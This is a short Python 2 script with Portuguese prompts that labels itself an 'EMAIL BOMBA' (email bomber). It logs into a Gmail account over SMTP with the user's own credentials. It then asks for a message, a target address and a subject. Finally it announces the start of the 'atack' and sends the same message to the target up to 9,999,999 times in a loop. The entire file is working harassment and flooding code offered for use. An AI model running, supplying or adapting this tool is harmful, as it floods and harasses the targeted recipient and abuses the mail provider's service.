#-*-coding:utf8;-*-

#enviar Gmail

print"|----------------------|"
print"|    ·EMAIL BOMBA·     |"
print"|               V1.5   |"
print"|  c/TLS  BY_AelKappela|"
print"|----------------------|"
print"2 rounds por 3/s "

import smtplib
import os,sys
print"iniciando servico de email"
server= smtplib.SMTP('smtp.gmail.com',587)
print"iniciando TLS"
print""
server.starttls()
print"digite seu email"

login = raw_input('email: ')
print"sua senha"
senha = raw_input('senha: ')
server.login(login,senha)

print""
print"Conectado !"
print""
print"mensagem Bomba"
msg= raw_input("mensagemBomba: ")
print""
maiu = raw_input("emailDestino: ")
print"subTitulo"
senf = raw_input("SubTitulo: ")

print""
print(msg)
print"comecando o atack"
for i in range(9999999):
  server.sendmail(senf,maiu,msg)
  print('enviado...')
  print""
